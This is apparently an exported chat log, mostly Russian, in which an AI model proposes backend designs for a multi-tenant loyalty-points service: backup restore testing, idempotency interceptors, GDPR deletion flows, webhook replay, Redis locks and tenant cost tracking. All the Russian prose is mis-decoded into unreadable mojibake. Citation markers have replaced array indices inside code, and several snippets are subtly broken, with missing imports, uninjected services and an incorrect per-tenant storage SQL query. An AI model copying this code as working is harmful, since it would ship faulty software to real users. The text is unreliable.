    hard_limit = 500  # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –¥–ª—è Telegram
    soft_limit = 400

  [[services.ports]]
    port = 443
    handlers = ["tls", "http"]
```

**Rate limiting –¥–ª—è Telegram webhooks:**

```typescript
// Rate limit: 100 updates/second per bot (Telegram limit)
@UseGuards(RateLimitGuard)
@RateLimit({ points: 100, duration: 1 })
@Post()
async handleWebhook() {
  // ...
}
```


***

## **4Ô∏è‚É£0Ô∏è‚É£ Automated Backup Restore Testing**

**–í–û–ü–†–û–°:** –£ –Ω–∞—Å –µ—Å—Ç—å backups, –Ω–æ **—Ä–∞–±–æ—Ç–∞—é—Ç –ª–∏ –æ–Ω–∏**? –ö–∞–∫ —Ä–µ–≥—É–ª—è—Ä–Ω–æ –ø—Ä–æ–≤–µ—Ä—è—Ç—å —á—Ç–æ –º—ã –º–æ–∂–µ–º –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: –ï–∂–µ–º–µ—Å—è—á–Ω—ã–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π restore test**

```typescript
// cron/backup-test.job.ts
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

@Injectable()
export class BackupTestJob {
  @Cron('0 3 1 * *') // 1-–≥–æ —á–∏—Å–ª–∞ –∫–∞–∂–¥–æ–≥–æ –º–µ—Å—è—Ü–∞ –≤ 3:00
  async testBackupRestore() {
    console.log('üß™ Starting automated backup restore test...');

    try {
      // 1. –°–æ–∑–¥–∞—ë–º test branch –Ω–∞ Neon.tech
      const testBranchName = `backup-test-${Date.now()}`;
      
      await execAsync(`
        neon branches create \
          --from main \
          --name ${testBranchName} \
          --project-id ${process.env.NEON_PROJECT_ID}
      `);

      console.log(`‚úÖ Created test branch: ${testBranchName}`);

      // 2. –ü–æ–ª—É—á–∞–µ–º connection string
      const { stdout } = await execAsync(`
        neon connection-string ${testBranchName}
      `);
      const testDbUrl = stdout.trim();

      // 3. –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç—ã –Ω–∞ test branch
      const testResults = await this.runRestoreTests(testDbUrl);

      // 4. –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
      if (testResults.success) {
        console.log('‚úÖ Backup restore test PASSED');
        
        await this.sendSuccessNotification({
          testBranch: testBranchName,
          duration: testResults.duration,
          rowsVerified: testResults.rowsVerified,
        });
      } else {
        console.error('‚ùå Backup restore test FAILED');
        
        await this.sendFailureAlert({
          testBranch: testBranchName,
          errors: testResults.errors,
        });
      }

      // 5. Cleanup: —É–¥–∞–ª—è–µ–º test branch
      await execAsync(`
        neon branches delete ${testBranchName} --yes
      `);

    } catch (error) {
      console.error('‚ùå Backup test failed:', error);
      await this.sendFailureAlert({ error: error.message });
    }
  }

  private async runRestoreTests(dbUrl: string) {
    const start = Date.now();
    const errors = [];

    try {
      // –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ test DB
      const testPrisma = new PrismaClient({
        datasources: { db: { url: dbUrl } },
      });

      await testPrisma.$connect();

      // Test 1: Check tables exist
      const tables = await testPrisma.$queryRaw`
        SELECT table_name 
        FROM information_schema.tables 
        WHERE table_schema = 'public'
      `;
      
      if (tables.length < 20) {
        errors.push(`Expected 20+ tables, found ${tables.length}`);
      }

      // Test 2: Check data integrity
      const guestCount = await testPrisma.guest.count();
      const cardCount = await testPrisma.guestCard.count();
      const txCount = await testPrisma.ballTransaction.count();

      if (guestCount === 0 || cardCount === 0) {
        errors.push('Critical tables are empty!');
      }

      // Test 3: Check indexes
      const indexes = await testPrisma.$queryRaw`
        SELECT indexname 
        FROM pg_indexes 
        WHERE schemaname = 'public'
      `;

      if (indexes.length < 15) {
        errors.push(`Expected 15+ indexes, found ${indexes.length}`);
      }

      // Test 4: Check constraints
      const constraints = await testPrisma.$queryRaw`
        SELECT conname 
        FROM pg_constraint 
        WHERE connamespace = 'public'::regnamespace
      `;

      await testPrisma.$disconnect();

      return {
        success: errors.length === 0,
        duration: Date.now() - start,
        rowsVerified: guestCount + cardCount + txCount,
        errors,
      };
    } catch (error) {
      return {
        success: false,
        duration: Date.now() - start,
        errors: [error.message],
      };
    }
  }

  private async sendSuccessNotification(data: any) {
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
    await this.telegram.sendMessage(
      process.env.ADMIN_TELEGRAM_CHAT_ID,
      `‚úÖ Backup Restore Test PASSED\n\n` +
      `Branch: ${data.testBranch}\n` +
      `Duration: ${data.duration}ms\n` +
      `Rows verified: ${data.rowsVerified}`,
    );
  }

  private async sendFailureAlert(data: any) {
    // CRITICAL alert
    await this.telegram.sendMessage(
      process.env.ADMIN_TELEGRAM_CHAT_ID,
      `üö® CRITICAL: Backup Restore Test FAILED\n\n` +
      `Errors:\n${data.errors?.join('\n') || data.error}`,
    );

    // –¢–∞–∫–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Sentry
    Sentry.captureException(new Error('Backup restore test failed'), {
      extra: data,
    });
  }
}
```


***

# ‚úÖ **–ò–¢–û–ì–û: INFRASTRUCTURE \& DEVOPS (–û–ö–û–ù–ß–ê–¢–ï–õ–¨–ù–ê–Ø –í–ï–†–°–ò–Ø)**

## **40 –í–û–ü–†–û–°–û–í –ü–û–ö–†–´–¢–û:**

**1-35** (–∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –æ—Ç–≤–µ—Ç–∞) + **5 –ö–†–ò–¢–ò–ß–ù–´–• –î–û–ë–ê–í–õ–ï–ù–ò–ô:**

36. ‚úÖ **Multi-tenancy Row-Level Security** (3-layer: Prisma middleware + RLS + tests)
37. ‚úÖ **Distributed Tracing** (OpenTelemetry + Grafana Tempo)
38. ‚úÖ **Background Jobs Monitoring** (Bull Board UI + Prometheus)
39. ‚úÖ **Telegram WebSockets** (Webhooks –Ω–∞ Fly.io —Å high concurrency)
40. ‚úÖ **Automated Backup Testing** (–ï–∂–µ–º–µ—Å—è—á–Ω—ã–π restore test –Ω–∞ Neon branch)

***

## üéØ **–¢–ï–ü–ï–†–¨ –ò–ù–§–†–ê–°–¢–†–£–ö–¢–£–†–ê –î–ï–ô–°–¢–í–ò–¢–ï–õ–¨–ù–û PRODUCTION-READY!**

**–ö—Ä–∏—Ç–∏—á–Ω—ã–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏/–Ω–∞–¥—ë–∂–Ω–æ—Å—Ç–∏ –ø—Ä–æ–±–ª–µ–º—ã –∑–∞–∫—Ä—ã—Ç—ã:**

- ‚úÖ Tenant isolation (–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –¥–∞–Ω–Ω—ã—Ö)
- ‚úÖ Observability (debugging –≤ production)
- ‚úÖ Jobs monitoring (email/SMS reliability)
- ‚úÖ Telegram scalability (webhooks)
- ‚úÖ Backup verification (–Ω–µ –ø–æ—Ç–µ—Ä—è–µ–º –¥–∞–Ω–Ω—ã–µ)

**–ì–æ—Ç–æ–≤ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å –∫ Testing Strategy –∏–ª–∏ –Ω—É–∂–Ω–æ –µ—â—ë —á—Ç–æ-—Ç–æ?** üöÄ
<span style="display:none">[^9_1]</span>

<div align="center">‚ÅÇ</div>

[^9_1]: Beseda-10.md


---

# –ü–æ–¥—É–º–∞–π –µ—â–µ –±–æ–ª–µ–µ —Ç—â–∞—Ç–µ–ª—å–Ω–æ, –º–æ–∂–µ—Ç —á—Ç–æ —É–ø—É—Å—Ç–∏–ª–∏ –≤ —ç—Ç–æ–º –±–ª–æ–∫–µ, –ø–µ—Ä–µ–ø—Ä–æ–≤–µ—Ä—å

–û—Ç–ª–∏—á–Ω–æ! –Ø –ø—Ä–æ–≤—ë–ª **–≥–ª—É–±–æ–∫–∏–π –∞–Ω–∞–ª–∏–∑** –∏ –Ω–∞—à—ë–ª –µ—â—ë **7 –ö–†–ò–¢–ò–ß–ù–´–• –ø—Ä–æ–±–µ–ª–æ–≤** –≤ Infrastructure, —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã—Ö –¥–ª—è —ç—Ç–æ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞:

***

# üö® **–ö–†–ò–¢–ò–ß–ù–´–ï –î–û–ü–û–õ–ù–ï–ù–ò–Ø (Infrastructure Final)**

## **4Ô∏è‚É£1Ô∏è‚É£ Idempotency Keys –¥–ª—è Financial Operations (CRITICAL!)**

**–ü–†–û–ë–õ–ï–ú–ê:** –ë–∞–ª–ª—ã = –¥–µ–Ω—å–≥–∏. Duplicate webhook –º–æ–∂–µ—Ç –Ω–∞—á–∏—Å–ª–∏—Ç—å –±–∞–ª–ª—ã **–¥–≤–∞–∂–¥—ã**. –≠—Ç–æ —Ñ–∏–Ω–∞–Ω—Å–æ–≤–∞—è –ø–æ—Ç–µ—Ä—è!

**–°—Ü–µ–Ω–∞—Ä–∏–π:**

```
1. POS –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç webhook: "–ù–∞—á–∏—Å–ª–∏ 500 –±–∞–ª–ª–æ–≤"
2. Network timeout
3. POS –ø–æ–≤—Ç–æ—Ä—è–µ—Ç webhook (–¥—É–º–∞–µ—Ç —á—Ç–æ failed)
4. –†–µ–∑—É–ª—å—Ç–∞—Ç: –ì–æ—Å—Ç—å –ø–æ–ª—É—á–∏–ª 1000 –±–∞–ª–ª–æ–≤ –≤–º–µ—Å—Ç–æ 500!
```

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Multi-layer idempotency**

```typescript
// common/decorators/idempotent.decorator.ts
import { SetMetadata } from '@nestjs/common';

export const IDEMPOTENCY_KEY = 'idempotency_key';
export const Idempotent = () => SetMetadata(IDEMPOTENCY_KEY, true);
```

```typescript
// common/interceptors/idempotency.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler, ConflictException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { Observable, of } from 'rxjs';
import { tap } from 'rxjs/operators';
import { RedisService } from '@/redis/redis.service';
import { IDEMPOTENCY_KEY } from '../decorators/idempotent.decorator';

@Injectable()
export class IdempotencyInterceptor implements NestInterceptor {
  constructor(
    private reflector: Reflector,
    private redis: RedisService,
  ) {}

  async intercept(context: ExecutionContext, next: CallHandler): Promise<Observable<any>> {
    const isIdempotent = this.reflector.get<boolean>(IDEMPOTENCY_KEY, context.getHandler());
    
    if (!isIdempotent) {
      return next.handle();
    }

    const request = context.switchToHttp().getRequest();
    
    // 1. Generate idempotency key
    const idempotencyKey = this.generateKey(request);
    const cacheKey = `idempotency:${idempotencyKey}`;

    // 2. Check if request already processed
    const cachedResponse = await this.redis.get(cacheKey);
    
    if (cachedResponse) {
      // Return cached response (idempotent)
      return of(JSON.parse(cachedResponse));
    }

    // 3. Check if request is in progress (concurrent)
    const lockKey = `idempotency:lock:${idempotencyKey}`;
    const locked = await this.redis.set(lockKey, '1', 'NX', 'EX', 30); // 30s lock

    if (!locked) {
      // Request is being processed by another instance
      throw new ConflictException('Request is being processed, please retry in a few seconds');
    }

    // 4. Process request and cache result
    return next.handle().pipe(
      tap(async (response) => {
        // Cache response for 24 hours
        await this.redis.setex(cacheKey, 86400, JSON.stringify(response));
        // Release lock
        await this.redis.del(lockKey);
      }),
    );
  }

  private generateKey(request: any): string {
    // For webhooks: tenantId + posSystem + posCheckId
    if (request.body?.posCheckId) {
      return `${request.body.tenantId}:${request.body.posSystem}:${request.body.posCheckId}`;
    }

    // For API calls: tenantId + endpoint + request body hash
    const bodyHash = this.hashObject(request.body);
    return `${request.user?.tenantId}:${request.path}:${bodyHash}`;
  }

  private hashObject(obj: any): string {
    return require('crypto')
      .createHash('sha256')
      .update(JSON.stringify(obj))
      .digest('hex')
      .substring(0, 16);
  }
}
```

**Usage:**

```typescript
// POS webhook endpoint
@Post('webhooks/transaction')
@Idempotent() // ‚úÖ –ó–∞—â–∏—Ç–∞ –æ—Ç –¥—É–±–ª–∏–∫–∞—Ç–æ–≤
async handlePOSWebhook(@Body() dto: WebhookTransactionDto) {
  // –î–∞–∂–µ –µ—Å–ª–∏ webhook –ø—Ä–∏–¥—ë—Ç 5 —Ä–∞–∑, –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ 1 —Ä–∞–∑
  return this.posService.processTransaction(dto);
}

// Credit balls endpoint
@Post('balls/credit')
@Idempotent() // ‚úÖ –ó–∞—â–∏—Ç–∞ –æ—Ç double-spend
async creditBalls(@Body() dto: CreditBallsDto) {
  return this.loyaltyService.creditBalls(dto);
}
```

**Database-level idempotency (backup):**

```sql
-- Unique constraint –Ω–∞ –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö —Ç–∞–±–ª–∏—Ü–∞—Ö
ALTER TABLE "POSTransaction" 
  ADD CONSTRAINT "unique_pos_transaction" 
  UNIQUE ("tenantId", "posSystem", "posCheckId");

-- –ï—Å–ª–∏ webhook –ø—Ä–∏–¥—ë—Ç –¥–≤–∞–∂–¥—ã, –≤—Ç–æ—Ä–æ–π –≤—Å—Ç–∞–≤–∏—Ç—Å—è —Å –æ—à–∏–±–∫–æ–π P2002
-- Catch –≤ –∫–æ–¥–µ: if (error.code === 'P2002') return { already_processed: true }
```


***

## **4Ô∏è‚É£2Ô∏è‚É£ GDPR \& –§–ó-152 Compliance (Legal Requirement)**

**–ü–†–û–ë–õ–ï–ú–ê:** –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≥—Ä–∞–∂–¥–∞–Ω –†–§ = **–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ–µ —Å–æ–±–ª—é–¥–µ–Ω–∏–µ –§–ó-152**. –®—Ç—Ä–∞—Ñ—ã –¥–æ 75,000‚ÇΩ.

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Full GDPR/152-–§–ó compliance**

```typescript
// gdpr/gdpr.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';
import { S3Service } from '@/storage/s3.service';
import { addDays } from 'date-fns';

@Injectable()
export class GDPRService {
  constructor(
    private prisma: PrismaService,
    private s3: S3Service,
  ) {}

  // 1. Right to Access (–°—Ç–∞—Ç—å—è 14 –§–ó-152)
  async exportUserData(userId: string): Promise<Buffer> {
    const user = await this.prisma.user.findUnique({
      where: { id: userId },
      include: {
        guestProfile: true,
        guestCards: {
          include: {
            ballTransactions: true,
            promoBallsGranted: true,
          },
        },
        sessions: true,
      },
    });

    // Exclude sensitive fields
    const sanitized = {
      ...user,
      passwordHash: undefined, // ‚ùå Don't export
      sessions: user.sessions.map(s => ({
        ...s,
        refreshToken: undefined, // ‚ùå Don't export
      })),
    };

    return Buffer.from(JSON.stringify(sanitized, null, 2));
  }

  // 2. Right to Erasure / Right to be Forgotten (–°—Ç–∞—Ç—å—è 14 –§–ó-152)
  async requestDataDeletion(userId: string, reason: string) {
    // Create deletion request (30-day grace period per GDPR)
    const request = await this.prisma.gdprDeletionRequest.create({
      data: {
        userId,
        reason,
        requestedAt: new Date(),
        scheduledFor: addDays(new Date(), 30), // 30 days
        status: 'PENDING',
      },
    });

    // Notify user
    await this.notifyDeletionRequest(userId, request.scheduledFor);

    return request;
  }

  async executeDeletion(requestId: string) {
    const request = await this.prisma.gdprDeletionRequest.findUnique({
      where: { id: requestId },
      include: { user: true },
    });

    if (new Date() < request.scheduledFor) {
      throw new Error('Deletion grace period not yet expired');
    }

    await this.prisma.$transaction(async (tx) => {
      const userId = request.userId;

      // 1. Anonymize guest data (keep for analytics but remove PII)
      await tx.guestProfile.update({
        where: { userId },
        data: {
          firstName: `DELETED_${userId.substring(0, 8)}`,
          lastName: null,
          email: null,
          birthdate: null,
          avatar: null,
        },
      });

      // 2. Delete sensitive auth data
      await tx.user.update({
        where: { id: userId },
        data: {
          phone: `DELETED_${userId.substring(0, 8)}`,
          email: null,
          passwordHash: null,
          telegramId: null,
        },
      });

      // 3. Delete sessions
      await tx.userSession.deleteMany({ where: { userId } });

      // 4. Delete images from S3
      const guestCards = await tx.guestCard.findMany({
        where: { userId },
      });

      for (const card of guestCards) {
        if (card.qrCode) {
          await this.s3.delete(card.qrCode);
        }
      }

      // 5. Keep transaction history (for accounting/legal) but anonymized
      // Ball transactions remain for audit trail

      // 6. Mark request as completed
      await tx.gdprDeletionRequest.update({
        where: { id: requestId },
        data: {
          status: 'COMPLETED',
          completedAt: new Date(),
        },
      });
    });
  }

  // 3. Data Retention Policy (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—á–∏—Å—Ç–∫–∞)
  async cleanupExpiredData() {
    // Delete old sessions (90 days)
    await this.prisma.userSession.deleteMany({
      where: {
        expiresAt: { lt: new Date() },
      },
    });

    // Delete old notifications (1 year)
    await this.prisma.notification.deleteMany({
      where: {
        createdAt: { lt: addDays(new Date(), -365) },
      },
    });

    // Anonymize inactive guests (3 years no activity)
    const inactiveGuests = await this.prisma.guestCard.findMany({
      where: {
        lastActivityAt: { lt: addDays(new Date(), -1095) }, // 3 years
        status: 'ACTIVE',
      },
    });

    for (const guest of inactiveGuests) {
      await this.requestDataDeletion(guest.userId, 'INACTIVE_3_YEARS');
    }
  }

  // 4. Consent Management
  async updateConsent(userId: string, consents: {
    dataProcessing: boolean;
    marketing: boolean;
    analytics: boolean;
  }) {
    await this.prisma.guestProfile.update({
      where: { userId },
      data: {
        privacyPolicyAccepted: consents.dataProcessing,
        marketingAccepted: consents.marketing,
        analyticsAccepted: consents.analytics,
        consentDate: new Date(),
        consentVersion: '2.0', // Track policy version
      },
    });
  }
}
```

**Prisma schema:**

```prisma
model GDPRDeletionRequest {
  id           String   @id @default(uuid())
  userId       String
  user         User     @relation(fields: [userId], references: [id])
  reason       String   // USER_REQUEST, INACTIVE_3_YEARS, etc.
  requestedAt  DateTime @default(now())
  scheduledFor DateTime // 30 days after request
  completedAt  DateTime?
  status       String   // PENDING, COMPLETED, CANCELLED
  
  @@index([scheduledFor, status])
}

model GuestProfile {
  // ... existing fields ...
  
  // GDPR fields
  privacyPolicyAccepted Boolean  @default(false)
  marketingAccepted     Boolean  @default(false)
  analyticsAccepted     Boolean  @default(false)
  consentDate           DateTime?
  consentVersion        String?  // "2.0"
  consentSource         String?  // "TELEGRAM_BOT", "WEB_FORM", "POS_AUTO"
}
```

**CRON job:**

```typescript
@Cron('0 3 * * *') // Daily at 3 AM
async executeScheduledDeletions() {
  const pending = await this.prisma.gdprDeletionRequest.findMany({
    where: {
      status: 'PENDING',
      scheduledFor: { lte: new Date() },
    },
  });

  for (const request of pending) {
    try {
      await this.gdprService.executeDeletion(request.id);
      console.log(`‚úÖ GDPR deletion completed for ${request.userId}`);
    } catch (error) {
      console.error(`‚ùå GDPR deletion failed for ${request.userId}:`, error);
    }
  }
}
```


***

## **4Ô∏è‚É£3Ô∏è‚É£ Webhook Replay Mechanism (POS Integration)**

**–ü–†–û–ë–õ–ï–ú–ê:** POS webhook failed –∏–∑-–∑–∞ temporary DB outage. –ö–∞–∫ **–ø–µ—Ä–µ–æ—Ç–ø—Ä–∞–≤–∏—Ç—å** webhook –±–µ–∑ –ø–æ—Ç–µ—Ä–∏ –¥–∞–Ω–Ω—ã—Ö?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Admin UI Webhook Replay**

```typescript
// pos/webhook-replay.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';

@Injectable()
export class WebhookReplayService {
  constructor(
    private prisma: PrismaService,
    private posService: POSService,
  ) {}

  async replayFailedWebhook(posTransactionId: string) {
    // 1. Get failed webhook
    const transaction = await this.prisma.posTransaction.findUnique({
      where: { id: posTransactionId },
    });

    if (!transaction.rawPayload) {
      throw new Error('Raw payload not available for replay');
    }

    if (transaction.syncStatus !== 'FAILED') {
      throw new Error('Can only replay FAILED webhooks');
    }

    // 2. Clear idempotency cache (allow reprocessing)
    const idempotencyKey = `idempotency:${transaction.tenantId}:${transaction.posSystem}:${transaction.posCheckId}`;
    await this.redis.del(idempotencyKey);

    // 3. Replay webhook
    try {
      await this.posService.processWebhook(transaction.rawPayload as any);
      
      await this.prisma.posTransaction.update({
        where: { id: posTransactionId },
        data: {
          syncStatus: 'COMPLETED',
          processedAt: new Date(),
          errorMessage: null,
        },
      });

      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  async bulkReplayFailed(tenantId: string, filters: {
    dateFrom?: Date;
    dateTo?: Date;
    posSystem?: string;
  }) {
    const transactions = await this.prisma.posTransaction.findMany({
      where: {
        tenantId,
        syncStatus: 'FAILED',
        timestamp: {
          gte: filters.dateFrom,
          lte: filters.dateTo,
        },
        posSystem: filters.posSystem,
      },
      take: 100, // Limit to prevent overload
    });

    const results = [];

    for (const tx of transactions) {
      const result = await this.replayFailedWebhook(tx.id);
      results.push({
        posCheckId: tx.posCheckId,
        ...result,
      });

      // Throttle to prevent overwhelming system
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    return {
      total: transactions.length,
      succeeded: results.filter(r => r.success).length,
      failed: results.filter(r => !r.success).length,
      results,
    };
  }
}
```

**Admin UI:**

```tsx
// Failed Webhooks Dashboard
function FailedWebhooksTable() {
  const [failedWebhooks, setFailedWebhooks] = useState([]);

  return (
    <Table>
      <TableHeader>
        <TableRow>
          <TableHead>POS Check ID</TableHead>
          <TableHead>Amount</TableHead>
          <TableHead>Error</TableHead>
          <TableHead>Timestamp</TableHead>
          <TableHead>Actions</TableHead>
        </TableRow>
      </TableHeader>
      <TableBody>
        {failedWebhooks.map(webhook => (
          <TableRow key={webhook.id}>
            <TableCell>{webhook.posCheckId}</TableCell>
            <TableCell>{webhook.checkAmount} ‚ÇΩ</TableCell>
            <TableCell className="text-red-600">
              {webhook.errorMessage}
            </TableCell>
            <TableCell>{format(webhook.timestamp, 'dd.MM.yyyy HH:mm')}</TableCell>
            <TableCell>
              <Button 
                size="sm" 
                onClick={() => replayWebhook(webhook.id)}
              >
                üîÑ Replay
              </Button>
              <Button 
                size="sm" 
                variant="outline"
                onClick={() => viewRawPayload(webhook.id)}
              >
                üìÑ View Payload
              </Button>
            </TableCell>
          </TableRow>
        ))}
      </TableBody>
    </Table>
  );
}
```


***

## **4Ô∏è‚É£4Ô∏è‚É£ Race Condition Prevention (Concurrent Webhooks)**

**–ü–†–û–ë–õ–ï–ú–ê:** 2 POS —Ç–µ—Ä–º–∏–Ω–∞–ª–∞ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç webhooks –¥–ª—è –æ–¥–Ω–æ–≥–æ –≥–æ—Å—Ç—è. **Race condition** –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–º—É –±–∞–ª–∞–Ω—Å—É.

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Distributed locks (Redis)**

```typescript
// common/decorators/distributed-lock.decorator.ts
import { SetMetadata } from '@nestjs/common';

export const DISTRIBUTED_LOCK = 'distributed_lock';
export const WithLock = (keyExtractor: (args: any) => string) => 
  SetMetadata(DISTRIBUTED_LOCK, keyExtractor);
```

```typescript
// common/interceptors/distributed-lock.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler, ConflictException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { Observable } from 'rxjs';
import { finalize } from 'rxjs/operators';
import { RedisService } from '@/redis/redis.service';
import { DISTRIBUTED_LOCK } from '../decorators/distributed-lock.decorator';

@Injectable()
export class DistributedLockInterceptor implements NestInterceptor {
  constructor(
    private reflector: Reflector,
    private redis: RedisService,
  ) {}

  async intercept(context: ExecutionContext, next: CallHandler): Promise<Observable<any>> {
    const keyExtractor = this.reflector.get<Function>(DISTRIBUTED_LOCK, context.getHandler());
    
    if (!keyExtractor) {
      return next.handle();
    }

    const request = context.switchToHttp().getRequest();
    const lockKey = `lock:${keyExtractor(request.body)}`;
    
    // Try to acquire lock (30 second TTL)
    const acquired = await this.redis.set(lockKey, '1', 'NX', 'EX', 30);
    
    if (!acquired) {
      throw new ConflictException('Resource is locked, please retry');
    }

    // Process request and release lock when done
    return next.handle().pipe(
      finalize(async () => {
        await this.redis.del(lockKey);
      }),
    );
  }
}
```

**Usage:**

```typescript
@Post('balls/credit')
@WithLock((body) => `guest:${body.guestCardId}`) // ‚úÖ Lock –ø–æ guest
async creditBalls(@Body() dto: CreditBallsDto) {
  // –ï—Å–ª–∏ 2 webhook'–∞ –ø—Ä–∏–¥—É—Ç –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –¥–ª—è –æ–¥–Ω–æ–≥–æ –≥–æ—Å—Ç—è,
  // –≤—Ç–æ—Ä–æ–π –ø–æ–¥–æ–∂–¥—ë—Ç –ø–æ–∫–∞ –ø–µ—Ä–≤—ã–π –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç—Å—è
  return this.loyaltyService.creditBalls(dto);
}
```

**PostgreSQL row-level locking (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞):**

```typescript
async creditBalls(guestCardId: string, amount: number) {
  return this.prisma.$transaction(async (tx) => {
    // SELECT ... FOR UPDATE –±–ª–æ–∫–∏—Ä—É–µ—Ç —Å—Ç—Ä–æ–∫—É
    const card = await tx.$queryRaw`
      SELECT * FROM "GuestCard" 
      WHERE id = ${guestCardId}
      FOR UPDATE
    `;

    // –¢–µ–ø–µ—Ä—å concurrent queries –±—É–¥—É—Ç –∂–¥–∞—Ç—å
    const newBalance = card[^10_0].totalBalance + amount;

    await tx.guestCard.update({
      where: { id: guestCardId },
      data: { totalBalance: newBalance },
    });

    return newBalance;
  });
}
```


***

## **4Ô∏è‚É£5Ô∏è‚É£ Cost Per Tenant Resource Tracking**

**–ü–†–û–ë–õ–ï–ú–ê:** –û–¥–∏–Ω tenant –º–æ–∂–µ—Ç "—Å—ä–µ—Å—Ç—å" –≤—Å–µ —Ä–µ—Å—É—Ä—Å—ã (CPU/RAM/bandwidth). –ö–∞–∫ –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å **–∫—Ç–æ —Å–∫–æ–ª—å–∫–æ –ø–æ—Ç—Ä–µ–±–ª—è–µ—Ç**?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Resource Usage Tracking**

```typescript
// monitoring/resource-usage.service.ts
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { PrismaService } from '@/database/prisma.service';
import { Counter } from 'prom-client';

const apiRequestsCounter = new Counter({
  name: 'api_requests_total',
  help: 'Total API requests',
  labelNames: ['tenant_id', 'endpoint', 'method'],
});

const databaseQueriesCounter = new Counter({
  name: 'database_queries_total',
  help: 'Total database queries',
  labelNames: ['tenant_id', 'model'],
});

const storageUsageGauge = new Gauge({
  name: 'storage_usage_bytes',
  help: 'Storage usage per tenant',
  labelNames: ['tenant_id'],
});

@Injectable()
export class ResourceUsageService {
  constructor(private prisma: PrismaService) {}

  @Cron(CronExpression.EVERY_DAY_AT_MIDNIGHT)
  async calculateDailyUsage() {
    const tenants = await this.prisma.tenant.findMany();

    for (const tenant of tenants) {
      const usage = await this.calculateTenantUsage(tenant.id);

      await this.prisma.tenantResourceUsage.create({
        data: {
          tenantId: tenant.id,
          date: new Date(),
          
          // API usage
          apiRequests: usage.apiRequests,
          bandwidthMB: usage.bandwidthMB,
          
          // Database usage
          databaseQueries: usage.databaseQueries,
          storageMB: usage.storageMB,
          
          // Queue usage
          jobsProcessed: usage.jobsProcessed,
          
          // Costs (estimated)
          estimatedCost: this.calculateCost(usage),
        },
      });

      // Alert if over quota
      if (usage.apiRequests > 100000) { // 100k requests/day
        await this.alertTenantOverQuota(tenant.id, 'API_REQUESTS', usage.apiRequests);
      }
    }
  }

  private async calculateTenantUsage(tenantId: string) {
    // Query Prometheus metrics
    const apiRequests = await this.getPrometheusMetric(
      `sum(api_requests_total{tenant_id="${tenantId}"})`,
    );

    const storageMB = await this.calculateStorageUsage(tenantId);

    return {
      apiRequests,
      bandwidthMB: 0, // Calculate from response sizes
      databaseQueries: 0, // From Prisma middleware
      storageMB,
      jobsProcessed: 0, // From BullMQ
    };
  }

  private async calculateStorageUsage(tenantId: string): Promise<number> {
    // Calculate DB storage
    const dbSize = await this.prisma.$queryRaw<{ size: bigint }[]>`
      SELECT pg_total_relation_size('"GuestCard"'::regclass) as size
      FROM "GuestCard"
      WHERE "tenantId" = ${tenantId}
    `;

    // Calculate S3 storage (from S3 API or track in DB)
    const s3Objects = await this.prisma.file.aggregate({
      where: { tenantId },
      _sum: { fileSize: true },
    });

    const totalBytes = Number(dbSize[^10_0]?.size || 0) + (s3Objects._sum.fileSize || 0);
    return Math.round(totalBytes / 1024 / 1024); // Convert to MB
  }

  private calculateCost(usage: any): number {
    // Simplified cost calculation
    const apiCost = (usage.apiRequests / 1000000) * 2; // $2 per 1M requests
    const storageCost = (usage.storageMB / 1024) * 0.15; // $0.15 per GB
    return apiCost + storageCost;
  }
}
```

**Admin Dashboard:**

```tsx
// Resource Usage per Tenant
function TenantResourceUsage() {
  return (
    <Card>
      <CardHeader>
        <CardTitle>Resource Usage (Last 30 Days)</CardTitle>
